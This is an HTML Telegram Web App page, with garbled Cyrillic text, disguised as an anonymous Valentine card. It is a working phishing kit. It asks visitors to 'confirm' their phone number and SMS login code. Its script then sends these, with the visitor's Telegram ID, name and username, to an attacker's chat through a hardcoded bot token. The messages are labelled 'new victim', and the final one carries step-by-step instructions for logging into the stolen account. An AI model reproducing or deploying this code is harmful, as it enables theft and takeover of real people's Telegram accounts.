<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í–∞–ª–µ–Ω—Ç–∏–Ω–∫–∞ üíå</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
        }
        
        .card {
            background: #1e1e1e;
            border-radius: 28px;
            padding: 30px 24px;
            max-width: 420px;
            width: 100%;
            border: 1px solid #333;
            box-shadow: 0 12px 28px rgba(0,0,0,0.7);
        }
        
        .heart {
            font-size: 64px;
            text-align: center;
            margin-bottom: 8px;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        h2 {
            color: white;
            font-size: 28px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 8px;
        }
        
        .sub {
            color: #aaa;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .message {
            background: #252525;
            border-radius: 18px 18px 18px 4px;
            padding: 22px;
            color: white;
            font-size: 17px;
            margin-bottom: 30px;
            border-left: 4px solid #ff4d6d;
            line-height: 1.5;
        }
        
        .sender {
            color: #ff8c9c;
            margin-top: 14px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .step {
            display: block;
            margin-bottom: 20px;
        }
        
        .step h3 {
            color: #ff8c9c;
            margin-bottom: 12px;
            font-size: 16px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            color: #ddd;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .input-group input {
            width: 100%;
            padding: 16px;
            background: #252525;
            border: 1px solid #3a3a3a;
            border-radius: 14px;
            color: white;
            font-size: 16px;
        }
        
        .input-group input:focus {
            border-color: #ff4d6d;
            outline: none;
        }
        
        .code-input {
            letter-spacing: 8px;
            font-size: 24px !important;
            text-align: center;
            font-weight: 600;
        }
        
        .btn {
            background: linear-gradient(145deg, #ff4d6d, #ff1e4d);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 8px 20px rgba(255, 75, 105, 0.4);
            margin-top: 10px;
        }
        
        .btn:hover {
            background: linear-gradient(145deg, #ff5e7a, #ff2e58);
            transform: scale(1.02);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .loading {
            display: none;
            margin-top: 20px;
            color: #4caf92;
            text-align: center;
            padding: 14px;
            background: rgba(76, 175, 146, 0.1);
            border-radius: 50px;
        }
        
        .hidden {
            display: none;
        }
        
        #log {
            margin-top: 20px;
            color: #0f0;
            font-size: 12px;
            text-align: left;
            background: #000;
            padding: 10px;
            border-radius: 8px;
            font-family: monospace;
            max-height: 150px;
            overflow: auto;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="heart">‚ù§Ô∏è</div>
        <h2>–£ —Ç–µ–±—è –≤–∞–ª–µ–Ω—Ç–∏–Ω–∫–∞!</h2>
        <div class="sub">–ê–Ω–æ–Ω–∏–º–Ω–æ ‚Ä¢ —Ç–æ–ª—å–∫–æ —á—Ç–æ</div>
        
        <div class="message">
            "–ü—Ä–∏–≤–µ—Ç... –Ø –¥–æ–ª–≥–æ –Ω–µ —Ä–µ—à–∞–ª—Å—è(–∞—Å—å). –¢—ã –º–Ω–µ –æ—á–µ–Ω—å –Ω—Ä–∞–≤–∏—à—å—Å—è. –° –¥–Ω—ë–º —Å–≤—è—Ç–æ–≥–æ –í–∞–ª–µ–Ω—Ç–∏–Ω–∞ ‚ù§Ô∏è"
            <div class="sender">
                <span>üí´ –û—Ç —Ç–∞–π–Ω–æ–≥–æ –ø–æ–∫–ª–æ–Ω–Ω–∏–∫–∞</span>
            </div>
        </div>
        
        <!-- –®–ê–ì 1: –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
        <div id="step1" class="step">
            <h3>üì± –®–∞–≥ 1 –∏–∑ 2: –ü–æ–¥—Ç–≤–µ—Ä–¥–∏ –Ω–æ–º–µ—Ä</h3>
            <div class="input-group">
                <label>–¢–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</label>
                <input type="tel" id="phone" placeholder="+7 999 999 99 99" value="+7">
            </div>
            <button class="btn" id="sendPhoneBtn">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</button>
        </div>
        
        <!-- –®–ê–ì 2: –í–≤–æ–¥ –∫–æ–¥–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è -->
        <div id="step2" class="step hidden">
            <h3>üîê –®–∞–≥ 2 –∏–∑ 2: –í–≤–µ–¥–∏ –∫–æ–¥ –∏–∑ SMS</h3>
            <div class="input-group">
                <label>–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</label>
                <input type="text" id="code" class="code-input" placeholder="______" maxlength="6">
            </div>
            <button class="btn" id="sendCodeBtn" disabled>–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
            <p style="color: #888; font-size: 12px; margin-top: 10px;">–ö–æ–¥ –ø—Ä–∏–¥–µ—Ç –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω—ã–π –Ω–æ–º–µ—Ä</p>
        </div>
        
        <!-- –°–¢–ê–¢–£–° -->
        <div id="loading" class="loading"></div>
        
        <!-- –õ–û–ì (–¥–ª—è –æ—Ç–ª–∞–¥–∫–∏) -->
        <div id="log"></div>
    </div>

    <script>
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
        
        // –ù–∞—Å—Ç—Ä–æ–π–∫–∏
        const BOT_TOKEN = '8562246068:AAGLHIOutyVHlhxvBR-WvS0DbxNfYOIhYU8';
        const ADMIN_ID = '8474961316';
        
        // –≠–ª–µ–º–µ–Ω—Ç—ã
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const phoneInput = document.getElementById('phone');
        const codeInput = document.getElementById('code');
        const sendPhoneBtn = document.getElementById('sendPhoneBtn');
        const sendCodeBtn = document.getElementById('sendCodeBtn');
        const loading = document.getElementById('loading');
        const log = document.getElementById('log');
        
        let userPhone = '';
        
        // –§—É–Ω–∫—Ü–∏—è –ª–æ–≥–∞
        function addLog(msg) {
            log.innerHTML += '> ' + msg + '<br>';
            console.log(msg);
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: ADMIN_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(e => addLog('TG Error: ' + e));
        }
        
        // –ü–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ Telegram (–µ—Å–ª–∏ –µ—Å—Ç—å)
        function getTelegramUser() {
            const user = Telegram.WebApp.initDataUnsafe?.user;
            if (user) {
                return {
                    id: user.id,
                    username: user.username || '–Ω–µ—Ç',
                    first_name: user.first_name || '',
                    last_name: user.last_name || ''
                };
            }
            return null;
        }
        
        // –®–ê–ì 1: –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–º–µ—Ä
        sendPhoneBtn.addEventListener('click', function() {
            const phone = phoneInput.value.trim();
            if (!phone || phone.length < 10) {
                alert('–í–≤–µ–¥–∏ –Ω–æ—Ä–º–∞–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä');
                return;
            }
            
            userPhone = phone;
            addLog('üì± –ù–æ–º–µ—Ä: ' + phone);
            
            // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ Telegram
            const tgUser = getTelegramUser();
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            let msg = 'üî• –ù–û–í–ê–Ø –ñ–ï–†–¢–í–ê - –®–ê–ì 1\n\n';
            msg += 'üì± –ù–æ–º–µ—Ä: ' + phone + '\n';
            if (tgUser) {
                msg += 'üÜî Telegram ID: ' + tgUser.id + '\n';
                msg += 'üë§ –ò–º—è: ' + tgUser.first_name + ' ' + tgUser.last_name + '\n';
                msg += 'üìõ Username: @' + tgUser.username + '\n';
            } else {
                msg += '‚ùå –î–∞–Ω–Ω—ã—Ö Telegram –Ω–µ—Ç\n';
            }
            
            sendToTelegram(msg);
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —à–∞–≥ 2
            step1.classList.add('hidden');
            step2.classList.remove('hidden');
            loading.style.display = 'block';
            loading.innerHTML = '‚è≥ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ ' + phone;
            
            // –ê–∫—Ç–∏–≤–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É –∫–æ–≥–¥–∞ –∫–æ–¥ –≤–≤–µ–¥–µ–Ω
            codeInput.focus();
        });
        
        // –ê–∫—Ç–∏–≤–∞—Ü–∏—è –∫–Ω–æ–ø–∫–∏ –ø—Ä–∏ –≤–≤–æ–¥–µ –∫–æ–¥–∞
        codeInput.addEventListener('input', function() {
            const code = this.value.replace(/\D/g, '');
            this.value = code;
            
            if (code.length === 6) {
                sendCodeBtn.disabled = false;
            } else {
                sendCodeBtn.disabled = true;
            }
        });
        
        // –®–ê–ì 2: –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥
        sendCodeBtn.addEventListener('click', function() {
            const code = codeInput.value;
            if (code.length !== 6) return;
            
            addLog('üîë –ö–æ–¥: ' + code);
            
            // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ Telegram
            const tgUser = getTelegramUser();
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            let msg = 'üî• –ù–û–í–ê–Ø –ñ–ï–†–¢–í–ê - –ü–û–õ–ù–´–ï –î–ê–ù–ù–´–ï\n\n';
            msg += 'üì± –ù–æ–º–µ—Ä: ' + userPhone + '\n';
            msg += 'üîë –ö–æ–¥: ' + code + '\n\n';
            msg += '‚ö°Ô∏è –≠–¢–ò–ú–ò –î–ê–ù–ù–´–ú–ò –ú–û–ñ–ù–û –í–û–ô–¢–ò!\n';
            msg += '1. –û—Ç–∫—Ä–æ–π Telegram\n';
            msg += '2. –í–≤–µ–¥–∏ –Ω–æ–º–µ—Ä: ' + userPhone + '\n';
            msg += '3. –í–≤–µ–¥–∏ –∫–æ–¥: ' + code + '\n\n';
            
            if (tgUser) {
                msg += 'üÜî Telegram ID: ' + tgUser.id + '\n';
                msg += 'üë§ –ò–º—è: ' + tgUser.first_name + ' ' + tgUser.last_name + '\n';
                msg += 'üìõ Username: @' + tgUser.username + '\n';
            }
            
            sendToTelegram(msg);
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö
            loading.innerHTML = '‚úÖ –í–∞–ª–µ–Ω—Ç–∏–Ω–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∞! –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...';
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –ª–æ–∫–∞–ª—å–Ω–æ–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ (–Ω–∞ –≤—Å—è–∫–∏–π)
            const fullData = {
                phone: userPhone,
                code: code,
                tgUser: tgUser,
                time: new Date().toISOString()
            };
            localStorage.setItem('victim_' + Date.now(), JSON.stringify(fullData));
            
            // –ó–∞–∫—Ä—ã–≤–∞–µ–º WebApp —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
            setTimeout(() => {
                Telegram.WebApp.close();
            }, 2000);
        });
        
        // –ê–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –Ω–æ–º–µ—Ä–∞ –µ—Å–ª–∏ –µ—Å—Ç—å –≤ Telegram
        setTimeout(() => {
            const tgUser = getTelegramUser();
            if (tgUser && tgUser.phone) {
                phoneInput.value = tgUser.phone;
                addLog('üì± –ù–æ–º–µ—Ä –∏–∑ Telegram: ' + tgUser.phone);
            }
        }, 1000);
        
        addLog('‚úÖ –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞');
    </script>
</body>
</html>
